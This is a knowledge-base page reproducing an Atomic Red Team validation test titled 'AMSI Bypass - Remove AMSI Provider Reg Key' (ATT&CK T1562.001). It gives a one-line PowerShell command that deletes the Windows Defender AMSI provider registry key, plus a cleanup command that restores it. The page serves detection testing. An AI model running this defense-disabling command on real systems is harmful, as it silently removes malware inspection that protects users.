---
atomic_guid: "13f09b91-c953-438e-845b-b585e51cac9b"
title: "AMSI Bypass - Remove AMSI Provider Reg Key"
framework: "atomic"
generated: "true"
attack_technique_id: "T1562.001"
attack_technique_name: "Impair Defenses: Disable or Modify Tools"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "13f09b91-c953-438e-845b-b585e51cac9b"
  - "AMSI Bypass - Remove AMSI Provider Reg Key"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# AMSI Bypass - Remove AMSI Provider Reg Key

With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.
This test removes the Windows Defender provider registry key. Upon execution, no output is displayed.
Open Registry Editor and navigate to "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\" to verify that it is gone.

## Metadata

- Atomic GUID: 13f09b91-c953-438e-845b-b585e51cac9b
- Technique: T1562.001: Impair Defenses: Disable or Modify Tools
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1562.001/T1562.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1562-impair_defenses|T1562.001]]

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse
```

### Cleanup

```powershell
New-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers" -Name "{2781761E-28E0-4109-99FE-B9D127C57AFE}" -ErrorAction Ignore | Out-Null
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.yaml)
